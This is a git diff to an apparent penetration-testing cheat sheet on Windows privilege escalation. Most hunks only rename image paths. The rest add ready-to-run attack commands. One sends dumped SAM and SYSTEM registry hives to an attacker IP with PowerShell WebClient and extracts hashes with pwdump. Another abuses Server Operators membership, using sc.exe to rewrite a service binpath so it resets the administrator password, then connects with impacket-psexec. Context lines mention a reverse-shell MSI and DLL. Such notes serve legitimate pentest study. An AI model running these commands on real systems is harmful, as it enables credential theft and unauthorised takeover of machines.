@@ -662,11 +662,11 @@ msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 
 Open an existing random project in Visual Studio 2022-> go to Extensions tab -> Manage extensions
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Install "Microsoft Visual Studio Installer Projects 2022" --> Restart VS to complete the installation
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Create a adduser.c file
 
@@ -686,13 +686,13 @@ Compile it&#x20;
 i686-w64-mingw32-gcc adduser.c -o adduser.exe
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -1114,6 +1114,15 @@ net start <service_name>
 
 <figure><img src="../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>
 
+\--------OR------------------------
+
+```powershell
+sc.exe stop browser
+sc.exe config browser binpath="C:\Windows\System32\cmd.exe /c net user administrator P@ssw0rd123!"
+sc.exe qc browser
+sc.exe start browser
+```
+
 </details>
 
 <details>
@@ -1151,7 +1160,7 @@ x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
 
 In CLIENT01 process monitor:
 
-![](<../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 * Create malicious msasn1.dll & save to C:\Program Files\FileZilla Server --> Rev shell
   * ```powershell
@@ -1162,7 +1171,7 @@ In CLIENT01 process monitor:
     ```
     *
 
-        <figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+        <figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
   * Start Filezilla server
@@ -1317,20 +1326,14 @@ reg save hklm\system c:\Temp\system
 Transfer files to attacker:
 
 ```bash
-# On Attacker:
-wget https://raw.githubusercontent.com/Tallguy297/SimpleHTTPServerWithUpload/master/SimpleHTTPServerWithUpload.py
-python3 SimpleHTTPServerWithUpload.py 80
-
-# On Victim:
-powershell -c curl.exe -F 'file=@c:\\temp\\system' http://192.168.45.162
-powershell -c curl.exe -F 'file=@c:\\temp\\sam' http://192.168.45.162
+(New-Object System.Net.WebClient).UploadFile('http://10.10.14.3/', 'c:\temp\sam')
+(New-Object System.Net.WebClient).UploadFile('http://10.10.14.3/', 'c:\temp\system')
 ```
 
 Dump out the hashes
 
 ```bash
-git clone https://github.com/Tib3rius/creddump7
-python3 creddump7/pwdump.py system sam
+/usr/share/creddump7/pwdump.py system sam
 ```
 
 </details>
@@ -1442,5 +1445,24 @@ Must use Microsoft signed binaries only!
 ```
 
 <figure><img src="../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>
+
+</details>
+
+<details>
+
+<summary>Abusing Server Operators Group Membership</summary>
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+Server operators group allows members to start, stop and change properties of the browser (Computer Browser) service
+
+```powershell
+sc.exe stop browser
+sc.exe config browser binpath="C:\Windows\System32\cmd.exe /c net user administrator P@ssw0rd123!"
+sc.exe qc browser
+sc.exe start browser
+
+impacket-psexec administrator@10.10.10.179
+```
 
 </details>
